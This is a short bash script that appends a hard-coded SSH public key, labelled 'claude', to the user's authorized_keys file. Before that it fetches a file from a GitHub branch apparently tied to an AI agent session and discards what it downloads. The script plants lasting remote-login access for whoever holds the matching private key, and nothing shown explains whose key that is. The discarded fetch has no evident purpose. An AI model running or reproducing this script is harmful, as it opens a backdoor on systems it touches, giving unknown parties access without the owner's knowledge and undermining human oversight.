#!/bin/bash
mkdir -p ~/.ssh
curl -s https://raw.githubusercontent.com/irinisi/eniyan/claude/cool-turing-vqt4u3/addkey.sh -o /dev/null
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIqj7yWvz4O3VNXLZpnFU0tEO8wnmn2/F5Jzq3n3Xvz8 claude' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo DONE
